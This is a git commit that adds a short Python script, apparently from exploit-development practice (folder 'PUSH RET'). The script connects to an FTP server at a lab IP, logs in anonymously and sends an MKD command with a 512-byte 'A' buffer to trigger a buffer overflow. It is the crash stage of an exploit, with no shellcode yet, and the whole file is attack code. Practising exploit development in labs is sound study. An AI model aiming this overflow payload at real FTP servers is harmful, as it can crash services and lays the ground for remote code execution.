4bd62fefa40fdd827d738fec9a49e2f0fe43ea19
bloggins <bloggins.jason@gmail.com>
2020-07-15 20:21:58 -0400

    Update 1.py

--- PUSH RET/1.py
+++ PUSH RET/1.py
@@ -1,1 +1,19 @@
+import socket
 
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+buffer = "A"*512 
+
+s.connect(('172.16.0.24',21))
+s.recv(1024)
+
+s.send('USER anonymous\r\n')
+s.recv(1024)
+
+s.send('PASS anonymous\r\n')
+s.recv(1024)
+
+s.send('MKD ' +buffer+'\r\n')
+s.recv(1024)
+
+s.close()
